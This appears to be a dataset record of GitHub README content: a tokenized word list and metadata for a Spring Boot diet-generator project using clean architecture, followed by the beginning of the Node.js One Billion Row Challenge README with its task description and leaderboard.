'application', 'use', 'lombok', 'library', 'domain', 'application', 'layer', 'lombok', 'lightweight', 'library', 'allow', 'u', 'reduce', 'lot', 'boilerplate', 'code', 'screen', 'see', 'usage', 'lombok', 'class', 'field', 'total', 'literally', 'reduced', 'line', 'code', 'line', 'may', 'wonder', 'application', 'layer', 'receive', 'data', 'database', 'without', 'knowing', 'anything', 'infrastructure', 'layer', 'solution', 'quite', 'interesting', 'application', 'layer', 'create', 'interface', 'template', 'logic', 'interface', 'implemented', 'infrastructure', 'layer', 'application', 'layer', 'need', 'know', 'done', 'usecase', 'implementation', 'belong', 'application', 'layer', 'usually', 'need', 'data', 'database', 'solve', 'problem', 'simply', 'register', 'infrastructure', 'layer', 'class', 'also', 'inject', 'implementation', 'required', 'repository', 'see', 'separate', 'application', 'domain', 'layer', 'framework', 'spring', 'case', 'completely', 'diagram', 'show', 'tha', 'basic', 'sample', 'implementation', 'approach', 'give', 'u', 'lot', 'flexibility', 'change', 'database', 'whole', 'framework', 'rewrite', 'whole', 'infrastructure', 'layer', 'without', 'changing', 'even', 'line', 'application', 'domain', 'layer', 'well', 'fact', 'core', 'still', 'depends', 'infrastructure', 'presentation', 'layer', 'need', 'border', 'clearly', 'created', 'package', 'according', 'clean', 'architecture', 'presented', 'model', 'model', 'created', 'way', 'help', 'software', 'development', 'team', 'describe', 'communicate', 'software', 'architecture', 'design', 'session', 'retrospectively', 'documenting', 'existing', 'codebase', 'way', 'create', 'map', 'code', 'various', 'level', 'detail', 'way', 'would', 'use', 'something', 'like', 'google', 'map', 'zoom', 'area', 'interested', 'read', 'model', 'link', 'model', 'part', 'system', 'context', 'container', 'component', 'code', 'calculator', 'component', 'code', 'diet', 'generator', 'component', 'code', 'ninja', 'service', 'component', 'domain', 'understand', 'application', 'first', 'need', 'possess', 'knowledge', 'human', 'body', 'work', 'human', 'body', 'work', 'kcal', 'work', 'calorie', 'measure', 'energy', 'talk', 'food', 'energy', 'use', 'term', 'kilocalorie', 'kcal', 'commonly', 'referred', 'simply', 'calorie', 'everyday', 'language', 'concept', 'calorie', 'intake', 'expenditure', 'deficit', 'central', 'understanding', 'weight', 'management', 'energy', 'source', 'food', 'eat', 'provides', 'energy', 'measured', 'kcal', 'energy', 'fuel', 'body', 'basic', 'function', 'like', 'breathing', 'blood', 'circulation', 'physical', 'activity', 'processing', 'food', 'energy', 'expenditure', 'body', 'us', 'energy', 'several', 'way', 'basal', 'metabolic', 'rate', 'bmr', 'energy', 'needed', 'basic', 'function', 'rest', 'physical', 'activity', 'energy', 'expended', 'exercise', 'routine', 'daily', 'movement', 'thermic', 'effect', 'food', 'tef', 'energy', 'used', 'digest', 'absorb', 'metabolize', 'food', 'weight', 'management', 'depends', 'balance', 'energy', 'intake', 'calorie', 'consume', 'energy', 'expenditure', 'calorie', 'burn', 'number', 'calorie', 'kcal', 'required', 'person', 'depends', 'various', 'factor', 'age', 'gender', 'weight', 'height', 'physical', 'activity', 'level', 'bmi', 'calculating', 'basal', 'metabolic', 'rate', 'bmr', 'help', 'understand', 'many', 'calorie', 'body', 'need', 'rest', 'maintain', 'basic', 'physiological', 'function', 'bmr', 'estimated', 'using', 'several', 'formula', 'equation', 'jeor', 'equation', 'commonly', 'used', 'application', 'currently', 'support', 'jeor', 'equation', 'male', 'equation', 'female', 'equation', 'tdee', 'calculate', 'total', 'daily', 'energy', 'expenditure', 'tdee', 'represents', 'total', 'number', 'calorie', 'needed', 'maintain', 'current', 'weight', 'multiply', 'basal', 'metabolic', 'rate', 'bmr', 'activity', 'factor', 'sedentary', 'little', 'exercise', 'bmr', 'lightly', 'active', 'light', 'bmr', 'moderately', 'active', 'moderate', 'bmr', 'active', 'hard', 'day', 'week', 'bmr', 'super', 'active', 'hard', 'physical', 'job', 'bmr', 'tef', 'calculating', 'thermic', 'effect', 'food', 'tef', 'necessary', 'average', 'person', 'currently', 'supported', 'may', 'change', 'future', 'data', 'representation', 'main', 'business', 'entity', 'application', 'create', 'object', 'consist', 'multiple', 'object', 'dish', 'created', 'object', 'using', 'special', 'algorithm', 'implemented', 'adjust', 'requirement', 'first', 'let', 'look', 'closer', 'object', 'understood', 'better', 'fundamental', 'data', 'represented', 'product', 'product', 'object', 'depicted', 'shown', 'screenshot', 'besides', 'obvious', 'field', 'name', 'id', 'database', 'representation', 'two', 'important', 'field', 'nutrient', 'filler', 'database', 'initialization', 'product', 'fetched', 'calorieninjas', 'marked', 'appropriate', 'filler', 'based', 'filler', 'dietgenerator', 'decides', 'product', 'used', 'increase', 'decrease', 'macronutrients', 'representation', 'calorie', 'carbohydrate', 'fat', 'protein', 'per', 'product', 'filler', 'enum', 'used', 'mark', 'product', 'indicate', 'product', 'used', 'adjust', 'macronutrients', 'application', 'filler', 'set', 'manually', 'best', 'controlled', 'result', 'algorithm', 'implemented', 'decide', 'product', 'suitable', 'filler', 'nutrient', 'object', 'contains', 'basic', 'public', 'method', 'addnutrients', 'subtractnutrients', 'createemptynutrients', 'first', 'two', 'return', 'void', 'take', 'another', 'nutrient', 'object', 'parameter', 'one', 'widely', 'use', 'across', 'application', 'perform', 'subtraction', 'addition', 'nutrient', 'last', 'method', 'static', 'used', 'starting', 'point', 'new', 'nutrient', 'calculation', 'calorie', 'carbohydrate', 'protein', 'fat', 'class', 'hold', 'specific', 'information', 'kind', 'wrapper', 'calorie', 'carbohydrate', 'protein', 'fat', 'every', 'wrapper', 'contain', 'totalvalue', 'field', 'actual', 'field', 'used', 'perform', 'calculation', 'let', 'look', 'wrapper', 'totalfats', 'saturatedfats', 'field', 'saturatedfats', 'amount', 'part', 'totalfats', 'value', 'see', 'normal', 'fat', 'listed', 'structure', 'want', 'get', 'value', 'fat', 'without', 'saturatedfats', 'need', 'perform', 'subtraction', 'knowing', 'may', 'useful', 'decide', 'implement', 'glycemic', 'load', 'use', 'value', 'carbohydrate', 'excluding', 'fiber', 'glycemic', 'load', 'supported', 'application', 'may', 'change', 'future', 'recipe', 'object', 'used', 'create', 'base', 'dish', 'diet', 'creation', 'useful', 'information', 'diettype', 'indicate', 'diet', 'used', 'mealtypes', 'indicate', 'meal', 'used', 'ingredientsproportion', 'field', 'store', 'information', 'percentage', 'ratio', 'recipe', 'guarantee', 'taste', 'base', 'portion', 'ever', 'decide', 'create', 'large', 'small', 'portion', 'adjust', 'macronutrients', 'using', 'product', 'marked', 'filler', 'ingredient', 'ratio', 'change', 'starting', 'point', 'always', 'also', 'object', 'represent', 'nutrition', 'information', 'per', 'product', 'mealtype', 'simple', 'enum', 'contain', 'supported', 'meal', 'class', 'algorithm', 'use', 'choose', 'appropriate', 'requested', 'diet', 'diettype', 'simple', 'enum', 'contain', 'supported', 'diet', 'class', 'algorithm', 'use', 'choose', 'appropriate', 'requested', 'diet', 'currently', 'application', 'support', 'one', 'type', 'high', 'protein', 'easily', 'extended', 'bigdecimal', 'domain', 'application', 'layer', 'build', 'java', 'class', 'used', 'perform', 'calculation', 'instead', 'primitive', 'variable', 'class', 'support', 'basic', 'math', 'operation', 'including', 'useful', 'rounding', 'enum', 'example', 'usage', 'presented', 'method', 'located', 'contains', 'chain', 'subtraction', 'multiplication', 'division', 'note', 'scale', 'used', 'round', 'result', 'decimal', 'place', 'result', 'multiplication', 'used', 'subtrahend', 'subtraction', 'dish', 'class', 'final', 'meal', 'representation', 'class', 'result', 'class', 'factory', 'method', 'take', 'amount', 'calorie', 'dish', 'productstogram', 'hold', 'actual', 'value', 'gram', 'required', 'dish', 'object', 'class', 'hold', 'information', 'total', 'nutrient', 'information', 'whole', 'meal', 'per', 'recipe', 'filed', 'recipe', 'dish', 'created', 'class', 'also', 'contains', 'method', 'used', 'adjust', 'macronutrients', 'diet', 'class', 'final', 'diet', 'representation', 'class', 'returned', 'generatediet', 'method', 'contains', 'list', 'dish', 'adjusted', 'given', 'total', 'whole', 'diet', 'shoppinglist', 'simple', 'name', 'product', 'amount', 'gram', 'class', 'also', 'contains', 'method', 'adjust', 'macronutrients', 'calculator', 'application', 'feature', 'three', 'distinct', 'calculator', 'first', 'two', 'standalone', 'calculator', 'application', 'includes', 'dedicated', 'controller', 'two', 'endpoint', 'facilitate', 'use', 'third', 'calculator', 'particularly', 'important', 'used', 'create', 'object', 'bmicalculator', 'simple', 'calculator', 'return', 'bmi', 'value', 'given', 'parameter', 'one', 'static', 'default', 'method', 'calculate', 'take', 'parameter', 'bodyweightinkg', 'heightincm', 'bmi', 'formula', 'utilize', 'metric', 'system', 'follows', 'see', 'screen', 'heightincm', 'converted', 'meter', 'bmrcalculator', 'interface', 'single', 'method', 'calculate', 'return', 'object', 'method', 'take', 'one', 'parameter', 'implemented', 'equation', 'also', 'implemented', 'using', 'interface', 'application', 'currently', 'support', 'mifflinstjeor', 'equation', 'male', 'female', 'presented', 'object', 'created', 'contains', 'actual', 'value', 'single', 'method', 'method', 'take', 'one', 'parameter', 'based', 'provided', 'activity', 'level', 'base', 'metabolic', 'rate', 'multiplied', 'result', 'returned', 'enum', 'presented', 'macrocalculator', 'sealed', 'interface', 'single', 'method', 'return', 'object', 'take', 'one', 'parameter', 'requires', 'implementation', 'diet', 'need', 'different', 'approach', 'macronutrients', 'example', 'average', 'person', 'train', 'consume', 'amount', 'protein', 'someone', 'engages', 'three', 'resistance', 'training', 'session', 'per', 'week', 'created', 'simple', 'record', 'hold', 'necessary', 'information', 'actual', 'implementation', 'us', 'equation', 'macronutrients', 'calculated', 'order', 'protein', 'fat', 'carbohydrate', 'essential', 'note', 'gram', 'protein', 'carbohydrate', 'equal', 'kcal', 'gram', 'fat', 'equal', 'kcal', 'value', 'remain', 'consistent', 'across', 'diet', 'type', 'protein', 'fat', 'carbohydrate', 'example', 'male', 'requested', 'diet', 'protein', 'per', 'day', 'total', 'daily', 'intake', 'fat', 'total', 'daily', 'intake', 'fat', 'carbohydrate', 'total', 'daily', 'intake', 'carbohydrate', 'per', 'day', 'serf', 'holder', 'calculated', 'value', 'used', 'determine', 'whether', 'value', 'need', 'increased', 'decreased', 'diet', 'also', 'two', 'method', 'take', 'parameter', 'generator', 'application', 'generator', 'first', 'one', 'simple', 'second', 'rather', 'complex', 'dietgenerator', 'interface', 'single', 'method', 'take', 'parameter', 'return', 'object', 'interface', 'implemented', 'provide', 'new', 'generator', 'current', 'application', 'implemented', 'class', 'section', 'dedicated', 'implementation', 'object', 'created', 'separately', 'diet', 'garbage', 'collected', 'request', 'completed', 'create', 'need', 'addition', 'basic', 'initialization', 'constructor', 'total', 'requested', 'calorie', 'reserved', 'macronutrient', 'adjustment', 'basecaloriespermeal', 'field', 'created', 'subtracting', 'reserved', 'calorie', 'total', 'calorie', 'dividing', 'numberofmeals', 'created', 'contains', 'necessary', 'information', 'generate', 'diet', 'includes', 'list', 'required', 'requested', 'object', 'later', 'usage', 'three', 'main', 'step', 'diet', 'creation', 'method', 'diet', 'plan', 'populated', 'specific', 'meal', 'type', 'based', 'requested', 'number', 'meal', 'first', 'meal', 'always', 'breakfast', 'last', 'meal', 'always', 'dinner', 'fourth', 'meal', 'applicable', 'snack', 'middle', 'meal', 'meal', 'random', 'picked', 'list', 'given', 'create', 'added', 'object', 'created', 'using', 'static', 'factory', 'method', 'nutrient', 'information', 'required', 'product', 'gram', 'calculated', 'given', 'hold', 'information', 'per', 'product', 'divided', 'create', 'factor', 'factor', 'multiplied', 'product', 'proportion', 'value', 'get', 'actual', 'required', 'gram', 'product', 'important', 'note', 'immediately', 'added', 'macronutrients', 'object', 'reduced', 'total', 'value', 'generated', 'requested', 'dish', 'added', 'object', 'retains', 'field', 'total', 'requested', 'calorie', 'reserved', 'calorie', 'value', 'remaining', 'field', 'incorrect', 'object', 'strictly', 'defined', 'percentage', 'ratio', 'making', 'impossible', 'create', 'perfectly', 'diet', 'plan', 'randomly', 'chosen', 'recipe', 'control', 'calorie', 'specific', 'macronutrient', 'value', 'must', 'adjusted', 'accordingly', 'method', 'method', 'check', 'field', 'value', 'negative', 'mean', 'much', 'given', 'macronutrient', 'diet', 'value', 'positive', 'mean', 'missing', 'macronutrient', 'diet', 'respectively', 'method', 'called', 'object', 'using', 'offset', 'target', 'bring', 'value', 'close', 'possible', 'see', 'screen', 'operation', 'performed', 'time', 'done', 'generate', 'diet', 'accurately', 'missing', 'macronutrients', 'adjusted', 'separately', 'set', 'carbohydrate', 'fat', 'adjustment', 'may', 'break', 'carbohydrate', 'amount', 'diet', 'let', 'assume', 'want', 'add', 'protein', 'diet', 'algorithm', 'look', 'marked', 'add', 'calculated', 'amount', 'product', 'satisfy', 'missing', 'protein', 'unfortunately', 'likely', 'method', 'going', 'add', 'also', 'carbohydrate', 'fat', 'product', 'every', 'iteration', 'required', 'macronutrients', 'need', 'adjusted', 'closer', 'three', 'iteration', 'sufficient', 'method', 'first', 'look', 'object', 'scaled', 'given', 'amount', 'requested', 'gram', 'distributed', 'uniformly', 'across', 'suitable', 'dish', 'e', 'calling', 'method', 'mentioned', 'method', 'perform', 'similar', 'operation', 'iterate', 'list', 'also', 'update', 'correct', 'change', 'difference', 'returned', 'subtracted', 'added', 'object', 'method', 'method', 'shoppinglistgenerator', 'simple', 'interface', 'one', 'default', 'method', 'generates', 'product', 'name', 'value', 'gram', 'entire', 'diet', 'requires', 'one', 'parameter', 'application', 'application', 'layer', 'contains', 'actual', 'business', 'logic', 'usage', 'domain', 'layer', 'orchestrates', 'use', 'case', 'indicate', 'interface', 'need', 'implemented', 'provide', 'correct', 'functionality', 'application', 'important', 'note', 'layer', 'domain', 'layer', 'free', 'framework', 'library', 'repositories', 'application', 'require', 'access', 'database', 'obtain', 'information', 'recipe', 'product', 'database', 'usage', 'dictated', 'interface', 'exposed', 'layer', 'application', 'layer', 'depended', 'actual', 'infrastructure', 'layer', 'care', 'kind', 'database', 'provide', 'information', 'requirement', 'interface', 'need', 'implemented', 'correctly', 'infrastructure', 'layer', 'use', 'case', 'use', 'case', 'actual', 'usage', 'domain', 'layer', 'contain', 'one', 'concrete', 'business', 'usage', 'application', 'code', 'perspective', 'one', 'public', 'method', 'unlimited', 'private', 'method', 'keep', 'layer', 'free', 'framework', 'library', 'use', 'case', 'need', 'registered', 'class', 'infrastructure', 'layer', 'allows', 'injected', 'presentation', 'layer', 'controller', 'see', 'infrastructure', 'layer', 'documentation', 'discover', 'detail', 'implementation', 'quite', 'simple', 'straightforward', 'consist', 'actual', 'calculator', 'method', 'call', 'interesting', 'use', 'case', 'class', 'need', 'actually', 'use', 'logic', 'created', 'domain', 'layer', 'next', 'layer', 'abstraction', 'none', 'low', 'level', 'implementation', 'presented', 'actual', 'usage', 'first', 'calculated', 'using', 'private', 'method', 'created', 'using', 'next', 'list', 'fetched', 'database', 'segregated', 'stored', 'data', 'gathered', 'perform', 'diet', 'generation', 'object', 'created', 'method', 'generatediet', 'used', 'create', 'rest', 'logic', 'happened', 'generator', 'class', 'ready', 'object', 'returned', 'presentation', 'layer', 'mapped', 'returned', 'user', 'infrastructure', 'infrastructure', 'layer', 'find', 'configuration', 'external', 'api', 'integration', 'persistence', 'connection', 'application', 'currently', 'us', 'spring', 'boot', 'framework', 'configuration', 'related', 'spring', 'kept', 'layer', 'addition', 'framework', 'application', 'utilizes', 'mongodb', 'database', 'calorieninjas', 'external', 'api', 'populate', 'product', 'spring', 'boot', 'configuration', 'bean', 'configuration', 'application', 'us', 'clean', 'architecture', 'approach', 'meaning', 'domain', 'application', 'layer', 'must', 'kept', 'separate', 'framework', 'dependency', 'mentioned', 'architecture', 'documentation', 'specific', 'way', 'achieve', 'need', 'register', 'class', 'application', 'layer', 'layer', 'allows', 'u', 'inject', 'class', 'component', 'within', 'application', 'keeping', 'domain', 'application', 'layer', 'framework', 'free', 'since', 'application', 'relatively', 'small', 'configuration', 'file', 'also', 'small', 'sample', 'registration', 'method', 'cors', 'configuration', 'resource', 'sharing', 'cors', 'security', 'feature', 'implemented', 'web', 'browser', 'allows', 'restricts', 'web', 'page', 'making', 'request', 'different', 'domain', 'one', 'served', 'web', 'page', 'done', 'prevent', 'potentially', 'malicious', 'website', 'accessing', 'sensitive', 'data', 'site', 'without', 'user', 'knowledge', 'allows', 'user', 'utilize', 'application', 'browser', 'cors', 'configuration', 'need', 'implemented', 'application', 'presentation', 'application', 'endpoint', 'exposed', 'spring', 'mvc', 'basic', 'config', 'provided', 'highly', 'recommended', 'adjust', 'setting', 'need', 'error', 'handling', 'ever', 'error', 'thrown', 'application', 'catch', 'return', 'custom', 'response', 'user', 'achieve', 'application', 'utilize', 'component', 'register', 'error', 'handled', 'class', 'case', 'dto', 'returned', 'user', 'message', 'date', 'description', 'see', 'presentation', 'layer', 'detail', 'dto', 'calorie', 'ninja', 'application', 'leverage', 'calorieninjas', 'external', 'api', 'gather', 'information', 'calorieninjas', 'offer', 'straightforward', 'registration', 'process', 'endpoint', 'free', 'tier', 'allows', 'request', 'per', 'month', 'application', 'startup', 'database', 'populated', 'using', 'data', 'calorieninjas', 'product', 'already', 'present', 'database', 'api', 'call', 'skipped', 'optimize', 'performance', 'reduce', 'unnecessary', 'request', 'fetch', 'indicated', 'list', 'resource', 'folder', 'class', 'parser', 'list', 'us', 'class', 'injected', 'special', 'format', 'need', 'kept', 'decide', 'extend', 'list', 'first', 'line', 'indicate', 'beginning', 'list', 'followed', 'property', 'always', 'order', 'property', 'need', 'contain', 'space', 'name', 'name', 'recipe', 'howto', 'preparation', 'step', 'diettype', 'high', 'protein', 'supported', 'diet', 'right', 'mealtype', 'list', 'element', 'separated', 'sign', 'see', 'domain', 'layer', 'available', 'meal', 'scalable', 'true', 'false', 'property', 'list', 'product', 'need', 'appear', 'separate', 'line', 'enclosed', 'top', 'bottom', 'line', 'format', 'follows', 'format', 'requested', 'api', 'see', 'domain', 'layer', 'documentation', 'property', 'need', 'given', 'integer', 'last', 'line', 'indicate', 'end', 'recipe', 'parse', 'fetch', 'data', 'using', 'provided', 'spring', 'dependency', 'library', 'caloriesninja', 'api', 'generate', 'hold', 'list', 'first', 'found', 'mapped', 'saved', 'database', 'using', 'persistence', 'application', 'utilize', 'mongodb', 'easy', 'use', 'nosql', 'database', 'clean', 'architecture', 'used', 'project', 'special', 'implementation', 'flow', 'database', 'connection', 'configuration', 'simple', 'consists', 'one', 'line', 'located', 'file', 'class', 'package', 'specified', 'scan', 'note', 'docker', 'compose', 'used', 'project', 'mean', 'uri', 'address', 'service', 'name', 'document', 'currently', 'application', 'main', 'document', 'decided', 'use', 'id', 'document', 'application', 'achieve', 'special', 'abstract', 'class', 'hold', 'id', 'type', 'created', 'also', 'contains', 'setter', 'method', 'used', 'serialization', 'id', 'presented', 'actual', 'document', 'need', 'extend', 'class', 'provide', 'id', 'special', 'created', 'listen', 'assign', 'uuid', 'mapper', 'document', 'need', 'mapper', 'map', 'domain', 'object', 'domain', 'step', 'mandatory', 'separate', 'domain', 'infrastructure', 'layer', 'generic', 'interface', 'created', 'implemented', 'actual', 'mapper', 'inner', 'class', 'used', 'represent', 'data', 'actual', 'also', 'need', 'mapper', 'example', 'class', 'repositories', 'mentioned', 'domain', 'layer', 'expose', 'interface', 'need', 'implemented', 'provide', 'reading', 'writing', 'database', 'repository', 'class', 'prefixed', 'suffixed', 'class', 'injected', 'registered', 'class', 'utilize', 'springjdbc', 'need', 'perform', 'additional', 'step', 'need', 'create', 'interface', 'extend', 'interface', 'repository', 'extend', 'adjusted', 'handle', 'custom', 'mongo', 'interface', 'always', 'prefix', 'interface', 'inject', 'class', 'implement', 'exposed', 'domain', 'layer', 'interface', 'actually', 'perform', 'writing', 'reading', 'database', 'way', 'keep', 'domain', 'layer', 'free', 'framework', 'look', 'another', 'angle', 'see', 'diagram', 'presentation', 'presentation', 'layer', 'responsible', 'handling', 'user', 'interface', 'logic', 'interacts', 'user', 'displaying', 'data', 'capturing', 'user', 'input', 'communicates', 'data', 'underlying', 'application', 'layer', 'without', 'containing', 'business', 'logic', 'currently', 'application', 'expose', 'rest', 'controller', 'user', 'used', 'perform', 'operation', 'controller', 'controller', 'path', 'prefixed', 'indicate', 'usage', 'api', 'version', 'detail', 'please', 'visit', 'swagger', 'documentation', 'endpoint', 'response', 'object', 'suffixed', 'endpoint', 'type', 'require', 'object', 'dto', 'object', 'suffixed', 'every', 'dto', 'object', 'inner', 'object', 'suffixed', 'dtos', 'object', 'used', 'transfer', 'data', 'user', 'would', 'like', 'avoid', 'responds', 'domain', 'object', 'achieve', 'mapper', 'class', 'ware', 'created', 'complex', 'object', 'built', 'method', 'maptodomain', 'simplify', 'complexity', 'controller', 'endpoint', 'important', 'expose', 'one', 'endpoint', 'diet', 'generation', 'method', 'endpoint', 'require', 'validated', 'dto', 'simple', 'implementation', 'json', 'format', 'presented', 'return', 'object', 'provide', 'endpoint', 'method', 'endpoint', 'require', 'validated', 'dto', 'simple', 'implementation', 'json', 'format', 'presented', 'method', 'endpoint', 'require', 'validated', 'dto', 'simple', 'implementation', 'json', 'format', 'presented', 'expose', 'endpoint', 'fetch', 'information', 'recipe', 'method', 'require', 'path', 'variable', 'expose', 'endpoint', 'fetch', 'information', 'product', 'method', 'require', 'path', 'variable', 'docker', 'application', 'us', 'docker', 'docker', 'compose', 'simplyfy', 'deployment', 'configuration', 'machine', 'consist', 'service', 'mongo', 'first', 'two', 'database', 'related', 'service', 'allows', 'u', 'explore', 'database', 'using', 'graphical', 'user', 'interface', 'dockerfile', 'react', 'application', 'dockerfile', 'spring', 'boot', 'app', 'note', 'use', 'multistage', 'approach', 'first', 'jar', 'file', 'built', 'secondly', 'application', 'started', 'jar', 'file', 'inspiration', 'http', 'clean', 'architecture', 'fitatu', 'http', 'end']","['application', 'layer', 'method', 'object', 'diet']",5,2,0,"['fatatu', 'diet', 'generator', 'technology', 'stack', 'backend', 'frontend', 'live', 'application', 'http', 'http', 'how', 'to', 'run', 'it', 'on', 'your', 'local', 'machine', 'make', 'sure', 'docker', 'docker', 'compose', 'instal', 'obtain', 'calorieninjas', 'api', 'key', 'install', 'git', 'clone', 'github', 'repository', 'set', 'environment', 'variable', 'start', 'docker', 'compose', 'commits', 'documentation', 'introduction', 'about', 'importance', 'documentation', 'what', 'fatatu', 'why', 'repository', 'exists', 'disclaimer', 'star', 'share', 'architecture', 'clean', 'architecture', 'model', 'system', 'context', 'container', 'component', 'code', 'calculator', 'component', 'code', 'diet', 'generator', 'component', 'code', 'ninja', 'service', 'component', 'domain', 'how', 'human', 'body', 'work', 'how', 'kcal', 'work', 'bmi', 'tdee', 'tef', 'data', 'representation', 'product', 'product', 'code', 'screenshot', 'filler', 'filler', 'code', 'screenshot', 'nutrient', 'nutrient', 'code', 'screenshot', 'calorie', 'code', 'screenshot', 'carbohydrate', 'code', 'screenshot', 'protein', 'code', 'screenshot', 'fat', 'code', 'screenshot', 'recipe', 'recipe', 'code', 'screenshot', 'mealtype', 'mealtype', 'code', 'screenshot', 'diettype', 'mealtype', 'code', 'screenshot', 'bigdecimal', 'bigdecimal', 'code', 'usage', 'screenshot', 'dish', 'dish', 'code', 'screenshot', 'diet', 'diet', 'code', 'screenshot', 'calculator', 'bmicalculator', 'bmicalculator', 'code', 'screenshot', 'bmrcalculator', 'bmrcalculator', 'code', 'screenshot', 'mifflincalculator', 'code', 'screenshot', 'bmrattributes', 'code', 'screenshot', 'basemetabolicrate', 'code', 'screenshot', 'activelevel', 'code', 'screenshot', 'macrocalculator', 'macrocalculator', 'code', 'screenshot', 'macrocalculatorfactory', 'code', 'screenshot', 'macrocalculator', 'code', 'screenshot', 'highproteinmacrocalculator', 'code', 'screenshot', 'macronutrient', 'code', 'screenshot', 'generator', 'dietgenerator', 'dietgeneratorimpl', 'member', 'constructor', 'code', 'screenshot', 'dietgeneratorimpl', 'generate', 'code', 'screenshot', 'dietgeneratorimpl', 'adddishes', 'code', 'screenshot', 'dish', 'createdish', 'code', 'screenshot', 'dietgenerator', 'adjustmacronutrient', 'code', 'screenshot', 'diet', 'increase', 'macro', 'code', 'screenshot', 'dish', 'increasefiller', 'code', 'screenshot', 'dish', 'reducefiller', 'code', 'screenshot', 'shoppinglistgenerator', 'shoppinglistgenerator', 'code', 'screenshot', 'application', 'repository', 'use', 'case', 'infrastructure', 'spring', 'boot', 'configuration', 'bean', 'configuration', 'bean', 'registration', 'screenshot', 'cors', 'configuration', 'cors', 'config', 'screenshot', 'error', 'handle', 'globalexceptionhandler', 'config', 'screenshot', 'calorie', 'ninja', 'persistence', 'document', 'mongouuid', 'screenshot', 'before', 'convert', 'event', 'screenshot', 'mapper', 'domain', 'mapper', 'screenshot', 'repository', 'spring', 'data', 'repo', 'screenshot', 'mongo', 'impl', 'repo', 'screenshot', 'presentation', 'controller', 'endpoint', 'docker', 'inspiration', 'the', 'end']",111,"['screenshot', 'code', 'diet', 'dish', 'docker']",63,47.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,67023,19.86190476190476,6.051786142411892,"['Java -> https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white', 'Spring Boot -> https://img.shields.io/badge/Spring%20Boot-6DB33F?style=for-the-badge&logo=spring-boot&logoColor=white', 'MongoDB -> https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white', 'Apache Maven -> https://img.shields.io/badge/Apache%20Maven-C71A36?style=for-the-badge&logo=Apache%20Maven&logoColor=white', 'Docker -> https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white', 'TypeScript -> https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white', 'React -> https://img.shields.io/badge/react-%2320232a.svg?style=for-the-badge&logo=react&logoColor=%2361DAFB', 'Vite -> https://img.shields.io/badge/vite-%23646CFF.svg?style=for-the-badge&logo=vite&logoColor=white', 'NPM -> https://img.shields.io/badge/NPM-%23CB3837.svg?style=for-the-badge&logo=npm&logoColor=white', 'MaterialUI -> https://img.shields.io/badge/Material--UI-007FFF?style=for-the-badge&logo=mui&logoColor=white', 'https://www.fatatu.com -> https://www.fatatu.com', 'LINK -> https://docs.docker.com/engine/install/', 'LINK -> https://docs.docker.com/compose/install/', 'LINK -> https://www.calorieninjas.com/register', 'LINK -> https://calorieninjas.com/profile', 'LINK -> https://github.com/git-guides/install-git', 'LINK -> http://localhost:5173/', 'SWAGGER -> http://localhost:8080/swagger-ui/index.html', 'LINK -> https://100commitow.pl/', 'PL -> https://www.youtube.com/@DevMentorsPL', 'ENG -> https://www.youtube.com/@DevMentorsEN', '100commits -> https://100commitow.pl/', 'LINK -> https://c4model.com/', 'Product Code screenshot', 'Filler Code screenshot', 'Nutrients Code screenshot', 'Calories Code screenshot', 'Carbohydrates Code screenshot', 'Proteins Code screenshot', 'Fats Code screenshot', 'Recipe Code screenshot', 'MealType Code screenshot', 'MealType Code screenshot', 'BigDecimal Code Usage screenshot', 'Dish Code screenshot', 'Diet Code screenshot', 'BMICalculator Code screenshot', 'BMRCalculator Code screenshot', 'MifflinCalculator Code screenshot', 'BMRAttributes Code screenshot', 'BaseMetabolicRate Code screenshot', 'ActiveLevel Code screenshot', 'MacroCalculator Code screenshot', 'MacroCalculatorFactory Code screenshot', 'MacroCalculator Code screenshot', 'HighProteinMacroCalculator Code screenshot', 'Macronutrient Code screenshot', 'DietGeneratorImpl members and constructor Code screenshot', 'DietGeneratorImpl generate Code screenshot', 'DietGeneratorImpl addDishes Code screenshot', 'Dish createDish Code screenshot', 'DietGenerator adjustMacronutrient Code screenshot', 'Diet increase macro Code screenshot', 'Dish increaseFiller Code screenshot', 'Dish reduceFiller Code screenshot', 'ShoppingListGenerator Code screenshot', 'Bean registration screenshot', 'CORS config screenshot', 'GlobalExceptionHandler config screenshot', 'MongoUUID screenshot', 'Before Convert Event screenshot', 'Domain Mapper screenshot', 'Spring Data Repo screenshot', 'Mongo Impl Repo screenshot']",64
1brc/nodejs,main,"# 1️⃣🐝🏎️ The One Billion Row Challenge with Node.js

## About the Challenge

The One Billion Row Challenge (1BRC) is a fun exploration of how far modern Java can be pushed for aggregating one billion rows from a text file.

Later the community created a dedicated @1brc organization to pay more attention to the implementations in other languages. This repository contains and accepts Node.js based implementations.

Grab all your (virtual) threads, reach out to SIMD, optimize your GC, or pull any other trick, and create the fastest implementation for solving this task!

<img src=""1brc.png"" alt=""1BRC"" style=""display: block; margin-left: auto; margin-right: auto; margin-bottom:1em; width: 50%;"">

The text file contains temperature values for a range of weather stations.
Each row is one measurement in the format `<string: station name>;<double: measurement>`, with the measurement value having exactly one fractional digit.
The following shows ten rows as an example:

```
Hamburg;12.0
Bulawayo;8.9
Palembang;38.8
St. John's;15.2
Cracow;12.6
Bridgetown;26.9
Istanbul;6.2
Roseau;34.4
Conakry;31.2
Istanbul;23.0
```

The task is to write a program which reads the file, calculates the min, mean, and max temperature value per weather station, and emits the results on stdout like this
(i.e. sorted alphabetically by station name, and the result values per station in the format `<min>/<mean>/<max>`, rounded to one fractional digit):

```
{Abha=-23.0/18.0/59.2, Abidjan=-16.2/26.0/67.3, Abéché=-10.0/29.4/69.0, Accra=-10.1/26.4/66.4, Addis Ababa=-23.7/16.0/67.0, Adelaide=-27.8/17.3/58.5, ...}
```

Submit your implementation and become part of the leaderboard!

## Results

| #   | Result (m:s.ms) | Implementation                                                                        | Submitter                                        | Notes                                                                              |
| --- | --------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------ | ---------------------------------------------------------------------------------- |
| 1.  | 00:23.000       | [link](https://github.com/1brc/nodejs/blob/main/src/main/nodejs/Edgar-P-yan/index.js) | [Edgar Pogosyan](https://github.com/Edgar-P-yan) | Multi-threaded, optimized parsing, input-specific `float` to `int` parser, no mmap |
